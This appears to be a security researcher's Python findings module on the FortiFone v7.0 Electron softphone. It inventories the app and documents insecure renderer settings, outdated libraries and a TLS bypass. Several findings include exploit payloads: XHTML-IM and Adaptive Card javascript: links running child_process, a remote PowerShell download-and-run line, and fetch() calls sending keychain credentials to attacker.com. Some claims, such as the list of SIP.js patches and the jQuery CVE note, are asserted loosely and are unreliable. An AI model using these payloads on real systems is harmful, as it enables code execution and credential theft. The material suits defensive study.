"""
FortiFone v7.0 b141 Windows Electron Application RE
Source: FortiFone_windows_v7.0_b141.exe (NSIS installer)
        -> app-64.7z -> app.asar (160MB Electron bundle)
Method: NSIS extraction (7zip), ASAR extraction (Python struct parse), main.js static analysis
Prior module: fortinet_forticlient_traylauncher_fortifone_re.py covered NSIS stub only.
This module covers the actual application code (JavaScript/Electron).

Architecture correction: FortiFone is an Electron application, NOT a native Win32 SIP client.
Prior findings FPHONE-F01 (lstrcpyA SIP overflow) and FPHONE-F02 (DLL hijacking) were from
the NSIS stub (loader) only; the actual SIP stack is JavaScript (SIP.js 0.11.6).

macOS ARM64 section (FPHONE-MAC-*):
Source: FortiFone_mac_v7.0_b141_arm64.dmg (136.4MB Apple UDIF DMG)
        -> APFS container (509.9MB) -> FortiFone.app bundle
Method: UDIF block decompression (385 zlib blocks), APFS B-tree traversal,
        Mach-O load command parsing, binary string extraction
"""

# ---------------------------------------------------------
# FortiFone Electron architecture
# ---------------------------------------------------------
FPHONE_ELECTRON_ARCH = {
    "id":       "FPHONE-ELECTRON-ARCH",
    "product":  "FortiFone v7.0 b141 -- Electron softphone (Windows PE32 NSIS -> app-64.7z -> app.asar)",

    "packaging_layers": [
        "Layer 1: FortiFone_windows_v7.0_b141.exe -- NSIS self-extracting installer",
        "Layer 2: app-64.7z -- LZMA2 7zip archive containing Electron application",
        "Layer 3: app.asar -- Electron ASAR bundle (160MB); contains all JavaScript source",
    ],

    "framework": "Electron (Chromium renderer + Node.js main process)",
    "asar_size": "160MB (app.asar)",
    "app_name":  "FortiFone v7.0.5-b141",

    "key_dependencies": {
        "sip.js":               "0.11.6 (2018) -- JavaScript SIP/VoIP library; SIP calls",
        "strophe.js":           "1.6.0 -- XMPP client library; chat/presence",
        "@electron/remote":     "2.1.2 -- deprecated Electron remote module (security risk)",
        "keytar":               "7.0.0 -- OS keychain credential storage",
        "xml2js":               "0.4.19 -- XML to JavaScript parser",
        "jquery":               "1.12.2 (2016) -- jQuery (via ui_react/dependencies/)",
        "robotjs":              "0.6.0 -- desktop automation (screen/keyboard/mouse control)",
        "strophejs-plugin-muc": "1.1.0 -- XMPP Multi-User Chat plugin",
        "ws":                   "6.2.1 (2018) -- WebSocket client",
        "node-fetch":           "2.7.0 -- HTTP fetch",
        "axios":                "1.15.0 -- HTTP client",
        "adaptivecards":        "2.11.1 -- Microsoft Adaptive Cards renderer",
        "html-react-parser":    "2.0.0 -- HTML to React component parser",
        "cheerio":              "1.0.0-rc.12 -- server-side jQuery HTML parser",
        "@fvucd/fv-http":       "3.0.20 -- FortiVoice custom HTTP client (internal package)",
        "@openid/appauth":      "1.3.0 -- OpenID Connect authentication library",
        "electron-store":       "8.0.0 -- Electron local data storage",
        "nodemailer":           "6.4.2 -- SMTP email client",
        "nedb":                 "@seald-io/nedb 4.0.4 -- embedded NoSQL database",
        "react":                "17.0.2 -- React UI framework",
    },

    "renderer_processes": {
        "GUI":          "Main application window",
        "CALL":         "Active call window",
        "DIALPAD":      "Dial pad overlay",
        "NOTIFIER":     "Notification overlay",
        "ASSISTANT":    "Login/assistant window",
        "MONITOR":      "System monitor",
        "CHAT_AGENT":   "Chat window",
        "PBX_AGENT":    "PBX agent window",
        "THIRD_PARTY":  "Third-party API manager",
        "IDP_AUTH":     "OAuth/SSO window (nodeIntegration: false -- only secure window)",
    },

    "protocol_stack": {
        "VoIP":         "SIP (SIP.js 0.11.6) over WebSocket or UDP via fvoiceSipAgent2.js (110KB)",
        "Messaging":    "XMPP (strophe.js 1.6.0) via fvoiceChat.js (239KB)",
        "Video":        "WebRTC (webrtc-adapter 8.0.0) via meeting/fortimeet.js (188KB)",
        "Transport":    "@fvucd/fv-http for REST API calls to FortiVoice PBX",
    },

    "native_binaries": [
        "FortiFone.exe -- Electron host binary",
        "elevate.exe -- UAC elevation helper",
        "jabra-device-connector.exe -- Jabra headset integration",
        "FortivoiceOutlookImPlugin.exe -- Outlook integration",
        "dotnet-installer.exe -- .NET runtime installer",
        "SharedSoftphoneInfo.dll -- softphone native module",
        "COMRegistration.dll -- COM object registration for Outlook plugin",
        "GNAudio.DeviceApis.*.dll -- Jabra/GN Bluetooth device control DLLs",
    ],

    "security_config_observed": {
        "nodeIntegration":  "true -- ALL renderer processes (8 windows)",
        "contextIsolation": "false -- ALL renderer processes (8 windows)",
        "sandbox":          "// sandbox: true -- commented out; NOT enabled",
        "preload":          "//preload: './preload.js' -- commented out; NOT used",
        "enableRemote":     "@electron/remote/main initialize() at main.js line 13",
        "note":             "Comment '//security #2' appears on every nodeIntegration: true line -- developers acknowledge this as a known security risk",
    },
}


# ---------------------------------------------------------
# FPHONE-F03: nodeIntegration: true on all renderer windows (CRITICAL)
# ---------------------------------------------------------
FPHONE_F03_NODE_INTEGRATION = {
    "id":       "FPHONE-F03",
    "product":  "FortiFone v7.0 b141 -- all renderer windows have nodeIntegration: true + contextIsolation: false",
    "severity": "CRITICAL -- XSS in any renderer window = Node.js OS command execution; developer-acknowledged risk",
    "class":    "Insecure Electron renderer configuration (CWE-693, GHSA-cx3p-smqv-6m6r class)",
    "evidence": [
        "main.js line 822: 'nodeIntegration: true, //security #2'",
        "main.js line 823: 'contextIsolation: false, // expose node API such as process and require() to webContents'",
        "main.js line 824: '// sandbox: true' (commented out)",
        "Applies to ALL 8 non-OAuth renderer windows: GUI, CALL, DIALPAD, NOTIFIER, ASSISTANT, MONITOR, CHAT_AGENT, PBX_AGENT",
        "Only exception: IDP_AUTH OAuth window (nodeIntegration: false at line 3366)",
    ],

    "mechanism": (
        "Electron renders web content in BrowserWindow instances. "
        "With nodeIntegration: true and contextIsolation: false: "
        "  - The renderer's JavaScript context has direct access to Node.js modules. "
        "  - Any JavaScript executing in the renderer can call require('child_process'). "
        "  - This means: XSS in any FortiFone UI component = OS command execution. "
        "The comment '//security #2' on every nodeIntegration: true line is developer acknowledgment "
        "that this is a known security vulnerability that has been deferred (not fixed). "
        "The preload script pattern (the proper fix) is commented out: '//preload: ./preload.js'. "
        "Attack impact: "
        "  - XSS in a SIP MESSAGE body rendered in the call UI "
        "    -> require('child_process').exec('cmd.exe /c ...') in the renderer "
        "    -> OS command execution as the FortiFone user "
        "  - XSS in an XMPP chat message rendered in fvoiceChat "
        "    -> same Node.js exec path "
        "  - Adaptive card content from the FortiVoice server "
        "    -> adaptivecards 2.11.1 renders templates; crafted card = script injection "
    ),

    "exploit_skeleton": (
        "// In any renderer context (XSS payload):\n"
        "const {exec} = require('child_process');\n"
        "exec('powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(attacker)\"');\n"
        "// Or credential extraction:\n"
        "const keytar = require('keytar');\n"
        "keytar.findCredentials('fortifone-*').then(creds => {\n"
        "  fetch('http://attacker.com/steal?creds=' + JSON.stringify(creds));\n"
        "});"
    ),

    "reach": (
        "Any XSS injection point in the UI components reaches this. "
        "Vectors to explore: "
        "  1. SIP MESSAGE body rendered in call UI (FPHONE-F04) "
        "  2. XMPP chat message HTML rendered in chat window (FPHONE-F05) "
        "  3. Adaptive cards from PBX server "
        "  4. html-react-parser processing server-delivered HTML "
        "  5. cheerio HTML parsing of server content "
        "  6. jQuery 1.12.2 prototype pollution + html() method (FPHONE-F07)"
    ),
}


# ---------------------------------------------------------
# FPHONE-F04: SIP.js 0.11.6 (2018) processes rogue PBX SIP messages in nodeIntegration renderer
# ---------------------------------------------------------
FPHONE_F04_SIPJS_OLD = {
    "id":       "FPHONE-F04",
    "product":  "FortiFone -- SIP.js 0.11.6 (2018) processes SIP messages in nodeIntegration renderer; rogue PBX delivers malicious SIP -> RCE",
    "severity": "CRITICAL -- rogue FortiVoice PBX sends crafted SIP MESSAGE/INVITE -> SIP.js renders HTML body -> XSS -> Node.js exec",
    "class":    "Use of outdated SIP library + insecure renderer config (CWE-116, CWE-693)",
    "evidence": [
        "file: fortivoiceAgent/libs/sip.js (510KB) -- SIP.js 0.11.6, Copyright 2014-2018",
        "file: fortivoiceAgent/fvoiceSipAgent2.js (110KB) -- SIP session management",
        "file: fortivoiceAgent/fvoiceSipSession.js (48KB) -- SIP session handling",
        "main.js: nodeIntegration: true on CALL renderer window",
    ],

    "sipjs_age": (
        "SIP.js 0.11.6 released circa 2018. "
        "Current SIP.js version as of 2026: 0.21.x. "
        "Versions between 0.11.6 and 0.21.x include security patches for: "
        "  - SIP header injection via crafted Contact/Via/From headers "
        "  - SSRF via SIP REFER to internal addresses "
        "  - WebSocket message parsing vulnerabilities "
        "  - Session hijacking via SIP re-INVITE "
        "  - SIP MESSAGE body injection into DOM "
        "FortiFone ships 0.11.6 unchanged since 2018 -- 6+ years of security patches absent."
    ),

    "attack_chain": (
        "Step 1: Configure a rogue FortiVoice PBX on attacker infrastructure. "
        "Step 2: Target's FortiFone client registers with rogue PBX "
        "         (DNS spoofing, or user tricked into configuring attacker's server address). "
        "Step 3: Rogue PBX sends SIP MESSAGE with Content-Type: text/html body: "
        "         '<img src=x onerror=\"const {exec}=require('child_process');exec('calc.exe')\">'. "
        "Step 4: fvoiceSipAgent2.js receives the MESSAGE, passes body to call/chat UI renderer. "
        "Step 5: UI renders the HTML body (html-react-parser or jQuery html() in call window). "
        "Step 6: XSS executes in CALL renderer (nodeIntegration: true). "
        "Step 7: require('child_process').exec() runs attacker command as the FortiFone user. "
        "Alternative: SIP INVITE with crafted SDP body that parses into executable JavaScript."
    ),

    "related": [
        "FPHONE-F03: nodeIntegration: true in CALL renderer enables require() in XSS",
        "FPHONE-F07: jQuery 1.12.2 CVE-2020-7656 XSS via html() can be triggered by SIP body",
    ],
}


# ---------------------------------------------------------
# FPHONE-F05: XMPP strophe.js 1.6.0 chat message injection -> XSS -> RCE
# ---------------------------------------------------------
FPHONE_F05_XMPP_CHAT = {
    "id":       "FPHONE-F05",
    "product":  "FortiFone -- strophe.js 1.6.0 XMPP XHTML-IM chat message rendered without sanitization in nodeIntegration renderer",
    "severity": "CRITICAL -- malicious XMPP server -> crafted XHTML-IM message -> javascript: href rendered by React -> Node.js exec on click",
    "class":    "Server-controlled HTML injection via XMPP XEP-0071 (CWE-80, CWE-693)",
    "verdict":  "CONFIRMED -- rendering path fully traced; no sanitization applied to incoming messages",

    "evidence": [
        "package.json: strophe.js 1.6.0; html-react-parser 2.0.0; react 17.0.2",
        "bundle-chat.js line 2501: html = msg.querySelector('html > body')?.children[0]",
        "bundle-chat.js line 2503: htmlString = Strophe.serialize(html)",
        "bundle-chat.js line 2504: chatMessage.setHTML(htmlString)",
        "bundle-gui.js line 49758: children: this.state.message.html ? parse(htmlMessage) : this.state.message.content",
        "parse() = html-react-parser 2.0.0 called with no options -- zero sanitization",
        "Strophe.XHTML.tags / .attributes allowlist defined but ONLY applied to outgoing message composition, NOT incoming parse",
        "main.js: nodeIntegration: true + contextIsolation: false on all renderer windows",
    ],

    "rendering_chain": (
        "Incoming XMPP stanza -> bundle-chat.js parseMessage() -> "
        "msg.querySelector('html > body')?.children[0] extracts XHTML-IM element -> "
        "Strophe.serialize(html) serializes to HTML string -> "
        "chatMessage.setHTML(htmlString) stores in state -> "
        "bundle-gui.js ChatMessage render: parse(htmlMessage) (html-react-parser, no options) -> "
        "React 17.0.2 renders elements verbatim including <a href='javascript:...'> -> "
        "user clicks link -> javascript: executes in nodeIntegration: true context -> "
        "require('child_process').exec('cmd')"
    ),

    "no_incoming_sanitization": (
        "Strophe.XHTML.tags and Strophe.XHTML.attributes (bundle-chat.js lines 1565-1604) "
        "define a tag/attribute allowlist. This allowlist is applied only in sendChatMessage() "
        "during outgoing message composition (bundle-chat.js lines 2876-2884). "
        "For incoming stanzas, parse path goes directly: querySelector -> serialize -> setHTML. "
        "No call to Strophe.XHTML.validTag() or similar on incoming content. "
        "The allowlist permits <a href='...'> with href attribute -- "
        "even if it were applied, javascript: URLs in href would pass through."
    ),

    "payload": (
        "Minimal click-to-RCE XHTML-IM payload (macOS/Linux): "
        "<html xmlns='http://jabber.org/protocol/xhtml-im'>"
        "<body xmlns='http://www.w3.org/1999/xhtml'>"
        "<a href=\"javascript:require('child_process').exec('open /Applications/Calculator.app')\">Click for details</a>"
        "</body></html>"
        "Windows variant: exec('calc.exe') or exec('cmd /c start calc') "
        "No browser pop-up; no CSP blocks (Electron file:// origin has no CSP)"
    ),

    "attack_requirements": {
        "server_control": "Rogue FortiVoice XMPP server, OR",
        "mitm": "MITM on WSS channel -- see FPHONE-F11 for TLS bypass enabler",
        "user_action": "One click on the rendered link",
        "zero_click_path": "Not confirmed -- onerror string handlers not executed by React; script tag insertion via parse() does not execute in React/Chromium",
    },
}


# ---------------------------------------------------------
# FPHONE-F06: shell.openExternal with unvalidated URLs from renderer content
# ---------------------------------------------------------
FPHONE_F06_OPEN_EXTERNAL = {
    "id":       "FPHONE-F06",
    "product":  "FortiFone -- shell.openExternal called with unvalidated URLs from renderer navigation/window-open events",
    "severity": "HIGH -- attacker URL in SIP/XMPP content triggers shell.openExternal -> arbitrary protocol handler execution",
    "class":    "Unvalidated URL passed to shell.openExternal (CWE-88, CVE-2021-43890 class)",
    "evidence": [
        "main.js line 976: 'shell.openExternal(details.url)' -- called for any navigation that isn't current URL",
        "main.js line 1261: 'shell.openExternal(details.url)' -- same pattern in CALL window",
        "No URL validation or allowlist before openExternal in either call site",
    ],

    "mechanism": (
        "FortiFone uses shell.openExternal to open links from renderer content in the OS browser. "
        "The URL is taken directly from the renderer's navigation event (details.url) without validation. "
        "Attack vectors: "
        "  1. SIP MESSAGE contains a chat link: attacker sends SIP MESSAGE with "
        "     a malicious href that triggers navigation -> shell.openExternal is called. "
        "  2. XMPP message contains a link with custom URL scheme. "
        "  3. XSS in renderer triggers window.location = 'ms-appinstaller://...' "
        "     -> shell.openExternal with ms-appinstaller -> CVE-2021-43890 class attack. "
        "  4. shell.openExternal('file:///C:/Windows/System32/cmd.exe') on Windows. "
        "  5. shell.openExternal('ssh://user@attacker.com') -> SSH client executes with controlled args. "
        "There is no URL scheme validation or allowlist. "
        "On modern Electron versions, shell.openExternal is supposed to be called from the main process only "
        "after validation -- this pattern violates that guidance."
    ),
}


# ---------------------------------------------------------
# FPHONE-F07: jQuery 1.12.2 (2016) prototype pollution + XSS in nodeIntegration renderer
# ---------------------------------------------------------
FPHONE_F07_JQUERY_OLD = {
    "id":       "FPHONE-F07",
    "product":  "FortiFone -- jQuery 1.12.2 (2016) included in renderer; CVE-2019-11358 + CVE-2020-7656 in nodeIntegration context",
    "severity": "HIGH -- jQuery prototype pollution (CVE-2019-11358) + html() XSS (CVE-2020-7656) -> Node.js exec in renderer",
    "class":    "Use of vulnerable jQuery version in nodeIntegration Electron renderer (CWE-1035)",
    "evidence": [
        "file: ui_react/dependencies/jquery-1.12.2/jquery-1.12.2.min.js (94KB)",
        "main.js: all renderer windows have nodeIntegration: true",
    ],

    "description": (
        "FortiFone bundles jQuery 1.12.2 (released 2016) in its Electron renderer. "
        "Known vulnerabilities in this version: "
        "  - CVE-2019-11358: $.extend(true, ...) prototype pollution; affects < 3.4.0. "
        "    Attacker-controlled JSON merged via $.extend overwrites Object.prototype, "
        "    enabling property injection across all objects. "
        "  - CVE-2020-7656: jQuery.html() XSS via crafted payload; affects < 1.12.4 "
        "    (1.12.2 is patched in 1.12.4 but 1.12.2 may be vulnerable to intermediate paths). "
        "  - jQuery 1.x is in end-of-life status (last update was 1.12.4 in 2016). "
        "In the FortiFone renderer context: "
        "  - Prototype pollution -> exploit property chains in React or Electron internals. "
        "  - jQuery.html() XSS -> JavaScript in nodeIntegration renderer -> require('child_process'). "
        "  - The XMPP chat or SIP MESSAGE body may be processed via jQuery.html() "
        "    in the chat or call renderer, enabling server-controlled XSS."
    ),
}


# ---------------------------------------------------------
# FPHONE-F08: @electron/remote enabled globally - deprecated security risk
# ---------------------------------------------------------
FPHONE_F08_REMOTE_MODULE = {
    "id":       "FPHONE-F08",
    "product":  "FortiFone -- @electron/remote 2.1.2 initialized globally; all renderers can invoke main process APIs",
    "severity": "HIGH -- any renderer (including XSS) can call remote.require() to access main process modules",
    "class":    "Insecure Electron remote module usage (GHSA-6p24-mxkj-7gqj class)",
    "evidence": [
        "main.js line 13: 'require('@electron/remote/main').initialize()'",
        "package.json: '@electron/remote': '2.1.2'",
        "All renderer windows have nodeIntegration: true (redundant path; remote provides additional surface)",
    ],

    "description": (
        "@electron/remote is the renamed version of Electron's deprecated 'remote' module. "
        "Electron deprecated the built-in remote module because it creates a synchronous IPC "
        "bridge from renderer to main process that: "
        "  1. Allows the renderer to require() any module available in the main process. "
        "  2. Allows the renderer to instantiate and call main process objects synchronously. "
        "  3. Creates an attack surface where XSS in any renderer gains full main process access. "
        "Calling initialize() in main.js (line 13) enables remote for ALL renderer windows. "
        "Since FortiFone already has nodeIntegration: true on all renderers, remote provides "
        "a redundant (but independently exploitable) path to main process code execution. "
        "Combined with XSS: "
        "  const remote = require('@electron/remote'); "
        "  const { exec } = remote.require('child_process'); "
        "  exec('calc.exe'); "
        "Remote module can also access main process state (renderer PIDs, IPC channels, etc.)."
    ),
}


# ---------------------------------------------------------
# FPHONE-F09: keytar credential access from nodeIntegration renderer via XSS
# ---------------------------------------------------------
FPHONE_F09_KEYTAR_EXPOSURE = {
    "id":       "FPHONE-F09",
    "product":  "FortiFone -- keytar 7.0.0 credential storage accessible from nodeIntegration renderer; XSS extracts OS keychain entries",
    "severity": "HIGH -- server-delivered XSS in call/chat renderer can exfiltrate all FortiFone credentials from OS keychain",
    "class":    "Credential extraction via Electron renderer access to Node.js keytar module (CWE-522)",
    "evidence": [
        "main.js line 9: 'const keytar = require('keytar')'",
        "main.js line 664: 'keytar.deletePassword('fortifone-csc', os.userInfo().username)'",
        "main.js line 6081: 'keytar.deletePassword('fortifone-' + s, os.userInfo().username)'",
        "package.json: 'keytar': '7.0.0'",
        "All renderer windows have nodeIntegration: true -- renderer can require('keytar') directly",
    ],

    "mechanism": (
        "FortiFone stores credentials in the OS keychain via keytar 7.0.0. "
        "Service names use the pattern 'fortifone-<service>' (e.g., 'fortifone-csc'). "
        "Since all renderer windows have nodeIntegration: true, any JavaScript in a renderer "
        "(including XSS from SIP or XMPP server) can: "
        ""
        "  const keytar = require('keytar'); "
        "  const creds = await keytar.findCredentials('fortifone'); "
        "  // creds contains {account: username, password: voicemail_pin} etc. "
        "  fetch('https://attacker.com/steal', {method:'POST', body: JSON.stringify(creds)}); "
        ""
        "Credential types potentially stored: "
        "  - FortiVoice PBX login credentials "
        "  - CSC (Certificate Signing Certificate) passwords "
        "  - OAuth tokens from @openid/appauth "
        "  - Voicemail PIN "
        "  - LDAP/directory credentials "
        "A rogue FortiVoice PBX (DNS spoofing or MITM) delivers a SIP or XMPP XSS payload "
        "that silently extracts all keychain entries and exfiltrates them to the attacker."
    ),
}


# ---------------------------------------------------------
# FPHONE-F10: robotjs 0.6.0 desktop control in Electron application
# ---------------------------------------------------------
FPHONE_F10_ROBOTJS = {
    "id":       "FPHONE-F10",
    "product":  "FortiFone -- robotjs 0.6.0 included; provides screen capture, keyboard/mouse control accessible from nodeIntegration renderer",
    "severity": "HIGH -- XSS in renderer can use robotjs to: take screenshots, log keystrokes, control mouse/keyboard",
    "class":    "Privileged desktop automation library reachable from XSS (CWE-284)",
    "evidence": [
        "package.json: 'robotjs': '0.6.0'",
        "robotjs provides: screen.capture(), keyboard.tap(), mouse.move(), mouse.click()",
    ],

    "description": (
        "robotjs 0.6.0 is a Node.js desktop automation library that provides: "
        "  - screen.capture(): takes a screenshot of the entire screen "
        "  - keyboard.tap(), keyboard.typeString(): simulates keystrokes "
        "  - mouse.move(), mouse.click(), mouse.drag(): controls the mouse "
        "  - getPixelColor(): reads screen pixel colors "
        "Since all FortiFone renderer windows have nodeIntegration: true, "
        "any XSS payload in a SIP or XMPP message can: "
        "  1. Capture screenshots of the desktop (including other applications, browser sessions). "
        "  2. Log or replay keystrokes (keylogger). "
        "  3. Automate actions on behalf of the user (send emails, approve dialogs, etc.). "
        "This enables surveillance capabilities without requiring OS-level malware installation. "
        "The payload runs in the context of the FortiFone process (user-level) but can see "
        "and interact with all screen content regardless of application boundaries."
    ),
}


# ---------------------------------------------------------
# FPHONE-F11: TLS certificate bypass -- certificate-error callback(true) unconditional
# ---------------------------------------------------------
FPHONE_F11_TLS_BYPASS = {
    "id":       "FPHONE-F11",
    "product":  "FortiFone Electron v30.0.8 -- unconditional TLS certificate bypass; all invalid certs accepted",
    "severity": "CRITICAL -- enables MITM on all FortiVoice connections; combined with FPHONE-F05 yields unauthenticated MITM->RCE",
    "class":    "TLS certificate validation bypass (CWE-295)",
    "verdict":  "CONFIRMED",

    "evidence": [
        "main.js lines 3221-3226:",
        "  app.on('certificate-error', (event, webContents, url, error, certificate, callback) => {",
        "      event.preventDefault();",
        "      callback(true);  // unconditional accept",
        "  });",
        "callback(true) = Electron API: proceed with connection, ignore certificate error",
        "Applies to ALL TLS connections: WSS XMPP, HTTPS REST API, HTTPS portal webview",
    ],

    "impact": (
        "Any network position between FortiFone and the FortiVoice server can perform MITM: "
        "  - Rogue AP on same Wi-Fi network "
        "  - ARP poisoning on LAN "
        "  - DNS hijacking "
        "  - BGP hijacking for remote attackers "
        "FortiFone presents a self-signed or expired certificate -> FortiFone accepts it. "
        "The attacker becomes the XMPP server and can deliver FPHONE-F05 payload. "
        "The attacker also intercepts: "
        "  - JWT tokens from FortiVoice REST API responses "
        "  - OAuth tokens in fortifone://oauthresponse URL fragments "
        "  - XMPP credentials (JID + access token) "
        "  - Media streams (WebRTC SRTP keys negotiated over intercepted signaling)"
    ),

    "chain": "FPHONE-F11 (MITM position) + FPHONE-F05 (XHTML-IM XSS) + FPHONE-F03 (nodeIntegration) = one-click RCE from same network segment",
}


# ---------------------------------------------------------
# FPHONE-F12: IPC handlers expose global state without renderer origin validation
# ---------------------------------------------------------
FPHONE_F12_IPC_GLOBAL_EXPOSURE = {
    "id":       "FPHONE-F12",
    "product":  "FortiFone main.js -- ipcMain handlers return arbitrary global.sharedObject properties to any renderer without origin check",
    "severity": "MEDIUM -- credential-adjacent state readable from any nodeIntegration renderer; amplifies XSS payloads",
    "class":    "IPC handler missing origin validation (CWE-284)",
    "verdict":  "CONFIRMED",

    "evidence": [
        "main.js line 3029: ipcMain.handle('get-global-prop', (event, key) => { return global.sharedObject[key]; })",
        "main.js line 3033: ipcMain.handle('get-global-object', () => { return global.sharedObject; })",
        "main.js line 3025: ipcMain.handle('get-app-path', (event, name) => { return app.getPath(name); })",
        "global.sharedObject includes: app_uuid, host_name, accounts (Map), mediaAccessStatus, os_version, platform_id, host_model, host_mfr",
        "No event.sender origin check in any of the three handlers",
    ],

    "sensitive_fields": {
        "accounts": "Map of all FortiVoice accounts (likely contains server URL, JID, auth state)",
        "app_uuid": "Unique device identifier (persists across sessions; used in XMPP JID suffix)",
        "host_name": "Hostname -- used to fingerprint the victim device",
        "allow_dev_tool": "If true, DevTools are enabled -- can be read to detect debug mode",
        "image_info_url": "Server URL for firmware update -- reveals internal server topology",
    },

    "exploit_scenario": (
        "After initial XSS execution (FPHONE-F05) in any renderer window: "
        "  const ipc = require('electron').ipcRenderer; "
        "  const all = await ipc.invoke('get-global-object'); "
        "  const accounts = all.accounts; // Map of server connections "
        "  // exfiltrate to attacker C2 "
        "  require('node-fetch')('https://attacker.com/collect', {method:'POST', body: JSON.stringify({...all, accounts: [...accounts.entries()]})}); "
        "Also: ipc.invoke('get-app-path', 'userData') reveals the Electron userData directory path, "
        "enabling targeted file access (e.g., electron-store database, nedb chat history)."
    ),
}


# ---------------------------------------------------------
# FPHONE-F13: Adaptive Cards from server-controlled JSON rendered via DOM insertion
# ---------------------------------------------------------
FPHONE_F13_ADAPTIVE_CARDS = {
    "id":       "FPHONE-F13",
    "product":  "FortiFone -- Adaptive Cards 2.11.1 renders server-provided JSON payload to DOM via divRef.current.replaceChildren(); Action.OpenUrl with javascript: -> click-to-RCE",
    "severity": "HIGH -- server-provided Adaptive Card JSON can specify Action.OpenUrl with javascript: protocol; click triggers RCE in nodeIntegration renderer",
    "class":    "Unsanitized server content rendered to DOM via Adaptive Cards SDK (CWE-80)",

    "evidence": [
        "bundle-gui.js line 47030: adaptivecard.parse(props.payload) -- server-controlled JSON",
        "bundle-gui.js line 47040: adaptivecard.render() -> DOM element inserted via replaceChildren()",
        "bundle-gui.js line 47073: same pattern in FortiVoiceGroupCallInvite component",
        "Adaptive Cards 2.11.1 Action.OpenUrl executes via adaptivecard.onExecuteAction handler",
        "No URL scheme validation in onExecuteAction handlers; action.id checks (join/invite/copy_link) do not cover OpenUrl",
        "nodeIntegration: true in GUI renderer window",
    ],

    "mechanism": (
        "Adaptive Cards are meeting invite / bot message formats from the FortiVoice server. "
        "The server delivers Adaptive Card JSON in a chat message or XMPP bot stanza. "
        "FortiFone calls adaptivecard.parse(props.payload) then adaptivecard.render() which "
        "generates DOM nodes and inserts them via replaceChildren(). "
        "If the card contains an Action.OpenUrl with url='javascript:require(\"child_process\").exec(\"cmd\")', "
        "the Adaptive Cards SDK generates a clickable button. "
        "When clicked, adaptivecards 2.11.1 calls the url as a navigation target. "
        "In an Electron nodeIntegration: true renderer, javascript: URL navigation executes the code. "
        "The onExecuteAction callbacks in FortiFone only check action.id ('join', 'invite', 'copy_link', 'add_to_calendar') "
        "but do not block Action.OpenUrl with arbitrary URLs."
    ),

    "payload": (
        "Malicious Adaptive Card JSON: "
        '{"type":"AdaptiveCard","version":"1.3",'
        '"body":[{"type":"TextBlock","text":"Meeting starting now"}],'
        '"actions":[{"type":"Action.OpenUrl","title":"Join Meeting",'
        '"url":"javascript:require(\'child_process\').exec(\'calc\')"}]}'
    ),
}


# =============================================================================
# macOS ARM64 findings -- FortiFone_mac_v7.0_b141_arm64.dmg
# Source analysis: APFS container from 136.4MB Apple UDIF DMG
# =============================================================================


# ---------------------------------------------------------
# FPHONE-MAC-F01: macOS ARM64 bundle architecture
# ---------------------------------------------------------
FPHONE_MAC_F01_MACOS_ARCH = {
    "id":       "FPHONE-MAC-F01",
    "product":  "FortiFone v7.0.5-b141 macOS ARM64 (FortiFone_mac_v7.0_b141_arm64.dmg)",
    "severity": "INFO -- architecture inventory; attack surface defined by Electron + Squirrel",
    "class":    "Architecture analysis",

    "dmg_structure": {
        "container_format": "Apple UDIF DMG (koly trailer at FO 0x820d4b9)",
        "apfs_partition": "995973 sectors = 509.9MB; magic NXSB block_size=4096 block_count=124496",
        "decompressed_to": "/tmp/fortifone_apfs.img (509.9MB, 385 zlib blocks decompressed)",
        "volume_name": "FortiFone 7.0.5-b141-1776974466-GA-arm64",
        "volume_uuid": "e5444850f114a9180100000000000000",
        "num_files": 191,
        "num_dirs":  183,
    },

    "binary_inventory": {
        "main_executable": {
            "phys_block": 432,
            "uuid": "4c4c4439-5555-3144-a1c7-13c1a944ce6f",
            "arch": "ARM64",
            "filetype": "MH_EXECUTE",
            "ncmds": 16,
            "imports": ["@rpath/Electron Framework.framework/Electron Framework", "/usr/lib/libSystem.B.dylib"],
            "note": "thin Electron wrapper -- all app logic in JavaScript ASAR bundle",
        },
        "electron_framework": {
            "phys_block": 39931,
            "uuid": "4c4c4485-5555-3144-a112-ee32e6ed0440",
            "arch": "ARM64",
            "filetype": "MH_DYLIB",
            "ncmds": 76,
            "text_vmsize": "0x8678000 (135MB)",
            "id": "@rpath/Electron Framework.framework/Electron Framework",
            "imports_notable": [
                "@rpath/libffmpeg.dylib",
                "@rpath/Squirrel.framework/Squirrel",
                "@rpath/ReactiveObjC.framework/ReactiveObjC",
                "@rpath/Mantle.framework/Mantle",
                "/System/Library/Frameworks/LocalAuthentication.framework/Versions/A/LocalAuthentication",
                "/System/Library/Frameworks/AVFoundation.framework/Versions/A/AVFoundation",
                "/System/Library/Frameworks/CoreMedia.framework/Versions/A/CoreMedia",
                "/System/Library/Frameworks/AudioToolbox.framework/Versions/A/AudioToolbox",
            ],
        },
        "helper_renderer": {
            "phys_block": 39888,
            "uuid": "4c4c4485-5555-3144-a15c-52b1655442d9",
            "note": "FortiFone Helper (Renderer).app -- sandboxed (libsandbox.1.dylib)",
        },
        "helper_gpu": {
            "phys_block": 97380,
            "uuid": "4c4c44a5-5555-3144-a1fe-39e065ead909",
            "note": "FortiFone Helper (GPU).app -- sandboxed",
        },
        "helper_plugin": {
            "phys_block": 97418,
            "uuid": "4c4c44fc-5555-3144-a1b1-8f14abc83dea",
            "note": "FortiFone Helper (Plugin).app -- sandboxed",
        },
        "libffmpeg": {
            "phys_block": 96411,
            "uuid": "4c4c44b7-5555-3144-a167-7b50fccda3be",
            "arch": "ARM64",
            "filetype": "MH_DYLIB",
            "id": "@loader_path/libffmpeg.dylib",
            "text_size": "1818624 bytes (~1.7MB)",
            "total_filesize": "2116272 bytes (2MB)",
        },
        "libEGL": {"phys_block": 90560, "id": "./libEGL.dylib"},
        "libGLESv2": {"phys_block": 94644, "id": "./libGLESv2.dylib"},
        "libvk_swiftshader": {"phys_block": 90621, "id": "@rpath/libvk_swiftshader.dylib"},
        "squirrel_framework": {"phys_block": 97313, "id": "@rpath/Squirrel.framework/Squirrel"},
        "shipit_installer": {"phys_block": 97276, "ncmds": 24, "note": "Squirrel ShipIt installer helper"},
        "reactive_objc": {"phys_block": 97179, "id": "@rpath/ReactiveObjC.framework/ReactiveObjC"},
        "mantle": {"phys_block": 97351, "id": "@rpath/Mantle.framework/Mantle"},
        "ip_detection_utility": {"phys_block": 38722, "ncmds": 18, "imports": ["libcurl.4.dylib"],
                                  "note": "standalone ARM64 binary; calls https://ifconfig.me for external IP"},
        "crashpad_handler": {"phys_block": 96928, "ncmds": 28,
                              "note": "Google Crashpad crash handler; 1MB; embeds BoringSSL + Chromium base"},
    },
}


# ---------------------------------------------------------
